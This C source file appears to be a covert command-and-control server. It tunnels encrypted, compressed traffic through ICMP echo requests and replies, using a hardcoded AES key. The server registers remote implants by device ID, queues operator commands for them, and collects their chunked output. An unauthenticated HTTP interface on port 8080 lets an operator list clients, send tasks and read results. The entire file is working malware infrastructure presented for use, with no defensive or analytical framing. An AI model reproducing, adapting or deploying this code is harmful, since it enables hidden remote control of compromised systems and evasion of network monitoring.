#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <endian.h>
#include <zlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <sys/socket.h>
#include <netinet/ip_icmp.h>
#include <poll.h>

#define MAX_PAYLOAD_SIZE 1400
#define MAX_CHUNK_SIZE 1300

#define MESSAGE_REGISTER 1
#define MESSAGE_POLL 2
#define MESSAGE_TASK 3
#define MESSAGE_TASK_RESULT 4
#define MESSAGE_ANNOUNCE_CHUNKED 5
#define MESSAGE_CHUNK 6
#define MESSAGE_ACK 7
#define MESSAGE_EMPTY 8

static const unsigned char ENCRYPTION_KEY[32] = {
	0x4e, 0xc9, 0x17, 0xa3, 0x58, 0xd2, 0x6b, 0xf0,
	0x91, 0x3a, 0xe5, 0x27, 0xc4, 0x88, 0x1d, 0x6a,
	0xf3, 0x0b, 0x59, 0xd8, 0x72, 0x41, 0xae, 0x96,
	0x05, 0xb7, 0xce, 0x23, 0xda, 0x64, 0x18, 0x9f
};

uint16_t calculate_checksum(const unsigned char *data, size_t length) {

	uint32_t checksum = 0;
	while (length >= 2) {
		checksum += ((uint32_t)data[0] << 8) | data[1];
		data += 2;
		length -= 2;
	}

	if (length == 1) {
		checksum += (uint32_t)data[0] << 8;
	}

	while (checksum >> 16) {
		checksum = (checksum & 0xffffu) + (checksum >> 16);
	}

	return (uint16_t)~checksum;

}

unsigned char *compress_encrypt(const unsigned char *message, size_t message_length, int compression_level, size_t *data_to_send_length) {

	uLongf compressed_length = compressBound((uLong)message_length);
	unsigned char *compressed_data = malloc(compressed_length);
	if (compress2(compressed_data, &compressed_length, message, (uLong)message_length, compression_level) != Z_OK) {
		free(compressed_data);
		*data_to_send_length = 0;
		return NULL;
	}

	unsigned char nonce[12];
	unsigned char authentication_tag[16];
	unsigned char *encrypted_data = malloc(compressed_length);
	RAND_bytes(nonce, sizeof(nonce));
	EVP_CIPHER_CTX *encryption_context = EVP_CIPHER_CTX_new();
	int encrypted_length = 0;
	int final_length = 0;
	EVP_EncryptInit_ex(encryption_context, EVP_aes_256_gcm(), NULL, ENCRYPTION_KEY, nonce);
	EVP_EncryptUpdate(encryption_context, encrypted_data, &encrypted_length, compressed_data, (int)compressed_length);
	EVP_EncryptFinal_ex(encryption_context, encrypted_data + encrypted_length, &final_length);
	encrypted_length += final_length;
	EVP_CIPHER_CTX_ctrl(encryption_context, EVP_CTRL_AEAD_GET_TAG, sizeof(authentication_tag), authentication_tag);
	EVP_CIPHER_CTX_free(encryption_context);

	size_t result_length = sizeof(nonce) + sizeof(authentication_tag) + (size_t)encrypted_length;
	unsigned char *data_to_send = malloc(result_length);
	memcpy(data_to_send, nonce, sizeof(nonce));
	memcpy(data_to_send + sizeof(nonce), authentication_tag, sizeof(authentication_tag));
	memcpy(data_to_send + sizeof(nonce) + sizeof(authentication_tag), encrypted_data, (size_t)encrypted_length);

	free(compressed_data);
	free(encrypted_data);

	*data_to_send_length = result_length;
	return data_to_send;

}

unsigned char *decrypt_uncompress(const unsigned char *received_data, size_t received_data_length, size_t *received_message_length) {

	unsigned char nonce[12];
	unsigned char authentication_tag[16];
	if (received_data_length < sizeof(nonce) + sizeof(authentication_tag)) {
		*received_message_length = 0;
		return NULL;
	}

	memcpy(nonce, received_data, sizeof(nonce));
	memcpy(authentication_tag, received_data + sizeof(nonce), sizeof(authentication_tag));

	int encrypted_length = (int)(received_data_length - sizeof(nonce) - sizeof(authentication_tag));
	unsigned char *decrypted_data = malloc((size_t)encrypted_length);
	EVP_CIPHER_CTX *decryption_context = EVP_CIPHER_CTX_new();
	int decrypted_length = 0;
	int final_decrypted_length = 0;
	EVP_DecryptInit_ex(decryption_context, EVP_aes_256_gcm(), NULL, ENCRYPTION_KEY, nonce);
	EVP_DecryptUpdate(decryption_context, decrypted_data, &decrypted_length, received_data + sizeof(nonce) + sizeof(authentication_tag), encrypted_length);
	EVP_CIPHER_CTX_ctrl(decryption_context, EVP_CTRL_AEAD_SET_TAG, sizeof(authentication_tag), authentication_tag);
	if (EVP_DecryptFinal_ex(decryption_context, decrypted_data + decrypted_length, &final_decrypted_length) <= 0) {
		EVP_CIPHER_CTX_free(decryption_context);
		free(decrypted_data);
		*received_message_length = 0;
		return NULL;
	}
	EVP_CIPHER_CTX_free(decryption_context);
	decrypted_length += final_decrypted_length;

	uLongf uncompressed_capacity = 4096;
	unsigned char *uncompressed_data = malloc(uncompressed_capacity);
	uLongf uncompressed_length = uncompressed_capacity;
	int status = uncompress(uncompressed_data, &uncompressed_length, decrypted_data, (uLong)decrypted_length);
	while (status == Z_BUF_ERROR) {
		uncompressed_capacity *= 2;
		uncompressed_data = realloc(uncompressed_data, uncompressed_capacity);
		uncompressed_length = uncompressed_capacity;
		status = uncompress(uncompressed_data, &uncompressed_length, decrypted_data, (uLong)decrypted_length);
	}

	free(decrypted_data);
	if (status != Z_OK) {
		free(uncompressed_data);
		*received_message_length = 0;
		return NULL;
	}

	*received_message_length = uncompressed_length;
	return uncompressed_data;

}

unsigned char *build_message(uint8_t message_type, uint64_t device_id, const unsigned char *message_body, size_t message_body_length, size_t *message_length) {

	size_t result_length = 1 + sizeof(device_id) + message_body_length;
	unsigned char *message = malloc(result_length);

	message[0] = message_type;
	uint64_t network_device_id = htobe64(device_id);
	memcpy(message + 1, &network_device_id, sizeof(network_device_id));

	if (message_body_length > 0) {
		memcpy(message + 1 + sizeof(network_device_id), message_body, message_body_length);
	}

	*message_length = result_length;
	return message;

}

int parse_message(const unsigned char *received_message, size_t received_message_length, uint8_t *received_message_type, uint64_t *device_id, unsigned char **received_message_body, size_t *received_message_body_length) {

	if (received_message_length < 1 + sizeof(uint64_t)) {
		return -1;
	}

	*received_message_type = received_message[0];

	uint64_t network_device_id;
	memcpy(&network_device_id, received_message + 1, sizeof(network_device_id));
	*device_id = be64toh(network_device_id);

	*received_message_body_length = received_message_length - 1 - sizeof(uint64_t);
	*received_message_body = malloc(*received_message_body_length + 1);
	memcpy(*received_message_body, received_message + 1 + sizeof(uint64_t), *received_message_body_length);
	(*received_message_body)[*received_message_body_length] = 0;

	return 0;

}

struct IncomingTransfer {
	uint32_t transfer_id;
	uint32_t total_amount_of_chunks;
	uint32_t next_chunk_index;
	size_t task_output_length;
	unsigned char *task_output;
};

struct Task {
	struct Task *next_task;
	unsigned char *command;
	size_t command_length;
};

struct TaskResult {
	struct TaskResult *next_result;
	unsigned char *task_output;
	size_t task_output_length;
};

struct Client {
	struct Client *next_client;
	uint64_t device_id;
	time_t last_seen;
	struct IncomingTransfer *incoming_transfer;
	struct Task *first_task;
	struct Task *last_task;
	struct TaskResult *first_result;
	struct TaskResult *last_result;
};

static struct Client *first_client = NULL;

struct Client *find_client(uint64_t device_id) {

	for (struct Client *client = first_client; client != NULL; client = client->next_client) {
		if (client->device_id == device_id) {
			return client;
		}
	}

	return NULL;

}

struct Client *register_client(uint64_t device_id) {

	struct Client *client = find_client(device_id);
	if (client != NULL) {
		client->last_seen = time(NULL);
		return client;
	}

	client = malloc(sizeof(struct Client));
	client->device_id = device_id;
	client->last_seen = time(NULL);
	client->incoming_transfer = NULL;
	client->first_task = NULL;
	client->last_task = NULL;
	client->first_result = NULL;
	client->last_result = NULL;
	client->next_client = first_client;
	first_client = client;

	return client;

}

void add_task(struct Client *client, unsigned char *command, size_t command_length) {

	struct Task *task = malloc(sizeof(struct Task));
	task->next_task = NULL;
	task->command = command;
	task->command_length = command_length;

	if (client->last_task == NULL) {
		client->first_task = task;
	} else {
		client->last_task->next_task = task;
	}
	client->last_task = task;

}

struct Task *move_to_next_task(struct Client *client) {

	struct Task *task = client->first_task;
	if (task == NULL) {
		return NULL;
	}

	client->first_task = task->next_task;
	if (client->first_task == NULL) {
		client->last_task = NULL;
	}

	return task;

}

void add_task_result(struct Client *client, unsigned char *task_output, size_t task_output_length) {

	struct TaskResult *result = malloc(sizeof(struct TaskResult));
	result->next_result = NULL;
	result->task_output = task_output;
	result->task_output_length = task_output_length;

	if (client->last_result == NULL) {
		client->first_result = result;
	} else {
		client->last_result->next_result = result;
	}
	client->last_result = result;

}

int handle_chunked_transfer_announcement(struct Client *client, const unsigned char *announcement_body, size_t announcement_body_length) {

	if (announcement_body_length != 12) {
		return -1;
	}

	uint32_t network_byte_order;
	memcpy(&network_byte_order, announcement_body, sizeof(network_byte_order));
	uint32_t transfer_id = be32toh(network_byte_order);
	memcpy(&network_byte_order, announcement_body + 4, sizeof(network_byte_order));
	uint32_t total_amount_of_chunks = be32toh(network_byte_order);
	memcpy(&network_byte_order, announcement_body + 8, sizeof(network_byte_order));
	uint32_t announced_output_length = be32toh(network_byte_order);

	size_t expected_amount_of_chunks = ((size_t)announced_output_length + MAX_CHUNK_SIZE - 1) / MAX_CHUNK_SIZE;
	if (expected_amount_of_chunks == 0) {
		expected_amount_of_chunks = 1;
	}
	if ((size_t)total_amount_of_chunks != expected_amount_of_chunks) {
		return -1;
	}

	if (client->incoming_transfer != NULL) {
		free(client->incoming_transfer->task_output);
		free(client->incoming_transfer);
		client->incoming_transfer = NULL;
	}

	struct IncomingTransfer *incoming_transfer = malloc(sizeof(struct IncomingTransfer));
	incoming_transfer->transfer_id = transfer_id;
	incoming_transfer->total_amount_of_chunks = total_amount_of_chunks;
	incoming_transfer->next_chunk_index = 0;
	incoming_transfer->task_output_length = announced_output_length;
	incoming_transfer->task_output = malloc((size_t)announced_output_length + 1);

	client->incoming_transfer = incoming_transfer;

	return 0;

}

unsigned char *build_ack(uint32_t transfer_id, uint32_t chunk_index, size_t *ack_body_length) {

	unsigned char *ack_body = malloc(8);

	uint32_t network_byte_order = htobe32(transfer_id);
	memcpy(ack_body, &network_byte_order, sizeof(network_byte_order));
	network_byte_order = htobe32(chunk_index);
	memcpy(ack_body + 4, &network_byte_order, sizeof(network_byte_order));

	*ack_body_length = 8;
	return ack_body;

}

int handle_chunk(struct Client *client, const unsigned char *chunk_body, size_t chunk_body_length, unsigned char **ack_body, size_t *ack_body_length) {

	if (chunk_body_length < 16) {
		return -1;
	}

	uint32_t network_byte_order;
	memcpy(&network_byte_order, chunk_body, sizeof(network_byte_order));
	uint32_t transfer_id = be32toh(network_byte_order);
	memcpy(&network_byte_order, chunk_body + 4, sizeof(network_byte_order));
	uint32_t chunk_index = be32toh(network_byte_order);
	memcpy(&network_byte_order, chunk_body + 12, sizeof(network_byte_order));
	uint32_t chunk_checksum = be32toh(network_byte_order);

	struct IncomingTransfer *incoming_transfer = client->incoming_transfer;
	if (incoming_transfer == NULL || incoming_transfer->transfer_id != transfer_id) {
		return -1;
	}

	if (chunk_index >= incoming_transfer->total_amount_of_chunks) {
		return -1;
	}

	size_t chunk_data_length = chunk_body_length - 16;
	size_t chunk_offset = (size_t)chunk_index * MAX_CHUNK_SIZE;
	if (chunk_data_length > MAX_CHUNK_SIZE || chunk_offset + chunk_data_length > incoming_transfer->task_output_length) {
		return -1;
	}
	if ((uint32_t)crc32(0, chunk_body + 16, chunk_data_length) != chunk_checksum) {
		return -1;
	}

	if (chunk_index < incoming_transfer->next_chunk_index) {
		*ack_body = build_ack(transfer_id, chunk_index, ack_body_length);
		return 0;
	}
	if (chunk_index != incoming_transfer->next_chunk_index) {
		return -1;
	}

	memcpy(incoming_transfer->task_output + chunk_offset, chunk_body + 16, chunk_data_length);
	incoming_transfer->next_chunk_index++;

	*ack_body = build_ack(transfer_id, chunk_index, ack_body_length);

	if (incoming_transfer->next_chunk_index >= incoming_transfer->total_amount_of_chunks) {
		add_task_result(client, incoming_transfer->task_output, incoming_transfer->task_output_length);
		incoming_transfer->task_output = NULL;
		free(incoming_transfer);
		client->incoming_transfer = NULL;
		return 1;
	}

	return 0;

}

ssize_t receive_echo_request(int fd, unsigned char *received_request_data, struct in_addr *sender_ip, uint16_t *identifier, uint16_t *sequence) {

	unsigned char request[2048];
	struct sockaddr_in sender = {0};
	socklen_t sender_length = sizeof(sender);
	ssize_t received_length = recvfrom(fd, request, sizeof(request), 0, (struct sockaddr *)&sender, &sender_length);
	if (received_length < 0) {
		return -1;
	}

	size_t request_length = (size_t)received_length;
	size_t ip_header_length = (request[0] & 0x0f) * 4;
	if (request_length < ip_header_length + 8) {
		return -1;
	}


	unsigned char *echo_request = request + ip_header_length;
	if (echo_request[0] != ICMP_ECHO || echo_request[1] != 0 || calculate_checksum(echo_request, request_length - ip_header_length) != 0) {
		return -1;
	}

	*sender_ip = sender.sin_addr;
	*identifier = (uint16_t)((echo_request[4] << 8) | echo_request[5]);
	*sequence = (uint16_t)((echo_request[6] << 8) | echo_request[7]);

	size_t request_data_length = request_length - ip_header_length - 8;
	memcpy(received_request_data, echo_request + 8, request_data_length);

	return (ssize_t)request_data_length;

}

int send_echo_reply(int fd, struct in_addr destination_ip, uint16_t identifier, uint16_t sequence, const unsigned char *data_to_send, size_t data_to_send_length) {

	struct sockaddr_in destination = {0};
	destination.sin_family = AF_INET;
	destination.sin_addr = destination_ip;

	unsigned char reply[8 + MAX_PAYLOAD_SIZE] = {0};
	reply[0] = ICMP_ECHOREPLY;
	reply[4] = (unsigned char)(identifier >> 8);
	reply[5] = (unsigned char)identifier;
	reply[6] = (unsigned char)(sequence >> 8);
	reply[7] = (unsigned char)sequence;
	if (data_to_send_length > MAX_PAYLOAD_SIZE) {
		return -1;
	}
	memcpy(reply + 8, data_to_send, data_to_send_length);
	uint16_t checksum = calculate_checksum(reply, 8 + data_to_send_length);
	reply[2] = (unsigned char)(checksum >> 8);
	reply[3] = (unsigned char)checksum;

	sendto(fd, reply, 8 + data_to_send_length, 0, (struct sockaddr *)&destination, sizeof(destination));

	return 0;

}

unsigned char *handle_client_message(const unsigned char *received_request_data, size_t received_request_data_length, size_t *reply_message_length) {

	size_t received_message_length = 0;
	unsigned char *received_message = decrypt_uncompress(received_request_data, received_request_data_length, &received_message_length);
	if (received_message == NULL) {
		return NULL;
	}

	uint8_t received_message_type = 0;
	uint64_t received_device_id = 0;
	unsigned char *received_message_body = NULL;
	size_t received_message_body_length = 0;
	if (parse_message(received_message, received_message_length, &received_message_type, &received_device_id, &received_message_body, &received_message_body_length) != 0) {
		free(received_message);
		return NULL;
	}

	struct Client *client = register_client(received_device_id);

	uint8_t reply_message_type = MESSAGE_EMPTY;
	unsigned char *reply_message_body = NULL;
	size_t reply_message_body_length = 0;
	struct Task *reply_task = NULL;
	if (received_message_type == MESSAGE_REGISTER || received_message_type == MESSAGE_POLL) {
		reply_task = move_to_next_task(client);
		if (reply_task != NULL) {
			reply_message_type = MESSAGE_TASK;
			reply_message_body = reply_task->command;
			reply_message_body_length = reply_task->command_length;
		}
	}
	if (received_message_type == MESSAGE_TASK_RESULT) {
		add_task_result(client, received_message_body, received_message_body_length);
		received_message_body = NULL;
	}
	if (received_message_type == MESSAGE_ANNOUNCE_CHUNKED) {
		handle_chunked_transfer_announcement(client, received_message_body, received_message_body_length);
	}
	if (received_message_type == MESSAGE_CHUNK) {
		unsigned char *ack_body = NULL;
		size_t ack_body_length = 0;
		if (handle_chunk(client, received_message_body, received_message_body_length, &ack_body, &ack_body_length) >= 0) {
			reply_message_type = MESSAGE_ACK;
			reply_message_body = ack_body;
			reply_message_body_length = ack_body_length;
		}
	}

	unsigned char *reply_message = build_message(reply_message_type, received_device_id, reply_message_body, reply_message_body_length, reply_message_length);

	free(reply_message_body);
	free(reply_task);
	free(received_message);
	free(received_message_body);

	return reply_message;

}

int create_http_listener(uint16_t port) {

	int fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0) {
		return -1;
	}

	const int reuse_address = 1;
	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &reuse_address, sizeof(reuse_address));

	struct sockaddr_in address = {0};
	address.sin_family = AF_INET;
	address.sin_addr.s_addr = htonl(INADDR_ANY);
	address.sin_port = htons(port);
	if (bind(fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
		close(fd);
		return -1;
	}

	if (listen(fd, 16) < 0) {
		close(fd);
		return -1;
	}

	return fd;

}

struct HttpRequest {
	char method[8];
	char path[512];
	unsigned char *body;
	size_t body_length;
};

int receive_http_request(int listener_fd, int *received_connection_fd, struct HttpRequest *received_request) {

	int connection_fd = accept(listener_fd, NULL, NULL);
	if (connection_fd < 0) {
		return -1;
	}

	unsigned char request[4096];
	size_t request_length = 0;
	ssize_t header_end = -1;
	while (request_length < sizeof(request)) {
		ssize_t received_length = recv(connection_fd, request + request_length, sizeof(request) - request_length, 0);
		if (received_length <= 0) {
			close(connection_fd);
			return -1;
		}
		request_length += (size_t)received_length;
		for (size_t i = 0; i + 4 <= request_length; i++) {
			if (request[i] == '\r' && request[i + 1] == '\n' && request[i + 2] == '\r' && request[i + 3] == '\n') {
				header_end = (ssize_t)i;
				break;
			}
		}
		if (header_end >= 0) {
			break;
		}
	}
	if (header_end < 0) {
		close(connection_fd);
		return -1;
	}

	size_t header_length = (size_t)header_end + 4;
	sscanf((const char *)request, "%7s %511s", received_request->method, received_request->path);

	size_t content_length = 0;
	char *content_length_header = strstr((const char *)request, "Content-Length:");
	if (content_length_header != NULL) {
		content_length = (size_t)strtol(content_length_header + 15, NULL, 10);
	}
	if (header_length + content_length > sizeof(request)) {
		close(connection_fd);
		return -1;
	}

	while (request_length < header_length + content_length) {
		ssize_t received_length = recv(connection_fd, request + request_length, sizeof(request) - request_length, 0);
		if (received_length <= 0) {
			close(connection_fd);
			return -1;
		}
		request_length += (size_t)received_length;
	}

	received_request->body_length = content_length;
	received_request->body = malloc(content_length + 1);
	memcpy(received_request->body, request + header_length, content_length);
	received_request->body[content_length] = 0;

	*received_connection_fd = connection_fd;

	return 0;

}

void send_http_response(int connection_fd, int status_code, const char *status_text, const unsigned char *response_body, size_t response_body_length) {

	char headers[256];
	int headers_length = sprintf(headers, "HTTP/1.1 %d %s\r\nContent-Type: text/plain\r\nContent-Length: %zu\r\nConnection: close\r\n\r\n", status_code, status_text, response_body_length);

	send(connection_fd, headers, (size_t)headers_length, 0);
	send(connection_fd, response_body, response_body_length, 0);

}

int parse_device_id(const char *received_path, uint64_t *device_id, const char **path) {

	if (strncmp(received_path, "/clients/", 9) != 0) {
		return -1;
	}

	char *path_end;
	unsigned long long parsed_device_id = strtoull(received_path + 9, &path_end, 16);
	if (path_end == received_path + 9 || *path_end != '/') {
		return -1;
	}

	*device_id = (uint64_t)parsed_device_id;
	*path = path_end;

	return 0;

}

void handle_list_clients_request(int connection_fd) {

	size_t capacity = 4096;
	size_t used_bytes = 0;
	unsigned char *response_body = malloc(capacity);

	char line[128];
	size_t line_length;
	for (struct Client *client = first_client; client != NULL; client = client->next_client) {
		line_length = (size_t)sprintf(line, "%016" PRIx64 " %ld %ld\n", client->device_id, (long)client->last_seen, (long)(time(NULL) - client->last_seen));
		while (used_bytes + line_length > capacity) {
			capacity *= 2;
			response_body = realloc(response_body, capacity);
		}
		memcpy(response_body + used_bytes, line, line_length);
		used_bytes += line_length;
	}

	send_http_response(connection_fd, 200, "OK", response_body, used_bytes);

	free(response_body);

}

void handle_create_task_request(int connection_fd, uint64_t device_id, struct HttpRequest *received_request) {

	struct Client *client = find_client(device_id);
	if (client == NULL) {
		send_http_response(connection_fd, 404, "Not Found", (const unsigned char *)"client not registered\n", sizeof("client not registered\n") - 1);
		free(received_request->body);
		return;
	}

	add_task(client, received_request->body, received_request->body_length);
	received_request->body = NULL;

	send_http_response(connection_fd, 200, "OK", (const unsigned char *)"ok\n", sizeof("ok\n") - 1);

}

void handle_list_task_results_request(int connection_fd, uint64_t device_id) {

	struct Client *client = find_client(device_id);
	if (client == NULL) {
		send_http_response(connection_fd, 404, "Not Found", (const unsigned char *)"client not registered\n", sizeof("client not registered\n") - 1);
		return;
	}

	size_t capacity = 4096;
	size_t used_bytes = 0;
	unsigned char *response_body = malloc(capacity);

	for (struct TaskResult *result = client->first_result; result != NULL; result = result->next_result) {
		while (used_bytes + sizeof("----\n") - 1 + result->task_output_length > capacity) {
			capacity *= 2;
			response_body = realloc(response_body, capacity);
		}
		memcpy(response_body + used_bytes, "----\n", sizeof("----\n") - 1);
		memcpy(response_body + used_bytes + sizeof("----\n") - 1, result->task_output, result->task_output_length);
		used_bytes += sizeof("----\n") - 1 + result->task_output_length;
	}

	send_http_response(connection_fd, 200, "OK", response_body, used_bytes);

	free(response_body);

}

void handle_http_request(int listener_fd) {

	int connection_fd = -1;
	struct HttpRequest received_request;
	if (receive_http_request(listener_fd, &connection_fd, &received_request) != 0) {
		return;
	}

	uint64_t device_id = 0;
	const char *path = NULL;
	int device_id_parsed = parse_device_id(received_request.path, &device_id, &path);

	if (strcmp(received_request.method, "GET") == 0 && strcmp(received_request.path, "/clients") == 0) {
		handle_list_clients_request(connection_fd);
	} else if (strcmp(received_request.method, "POST") == 0 && device_id_parsed == 0 && strcmp(path, "/task") == 0) {
		handle_create_task_request(connection_fd, device_id, &received_request);
	} else if (strcmp(received_request.method, "GET") == 0 && device_id_parsed == 0 && strcmp(path, "/results") == 0) {
		handle_list_task_results_request(connection_fd, device_id);
	} else {
		send_http_response(connection_fd, 404, "Not Found", (const unsigned char *)"not found\n", sizeof("not found\n") - 1);
	}

	free(received_request.body);

	close(connection_fd);

}

int main() {

	int icmp_fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	if (icmp_fd < 0) {
		return 1;
	}

	int http_fd = create_http_listener(8080);
	if (http_fd < 0) {
		return 1;
	}

	struct pollfd waiting_sockets[2] = {
		{ .fd = icmp_fd, .events = POLLIN },
		{ .fd = http_fd, .events = POLLIN }
	};

	while (1) {

		poll(waiting_sockets, 2, -1);

		if (waiting_sockets[0].revents & POLLIN) {

			unsigned char received_request_data[2048];
			struct in_addr sender_ip = {0};
			uint16_t identifier = 0;
			uint16_t sequence = 0;
			ssize_t received_request_data_length = receive_echo_request(icmp_fd, received_request_data, &sender_ip, &identifier, &sequence);
			if (received_request_data_length >= 0) {

				size_t reply_message_length = 0;
				unsigned char *reply_message = handle_client_message(received_request_data, (size_t)received_request_data_length, &reply_message_length);
				if (reply_message != NULL) {

					size_t data_to_send_length = 0;
					unsigned char *data_to_send = compress_encrypt(reply_message, reply_message_length, 9, &data_to_send_length);
					free(reply_message);
					if (data_to_send != NULL) {
						send_echo_reply(icmp_fd, sender_ip, identifier, sequence, data_to_send, data_to_send_length);
					}
					free(data_to_send);

				}

			}

		}

		if (waiting_sockets[1].revents & POLLIN) {
			handle_http_request(http_fd);
		}

	}

	return 0;

}
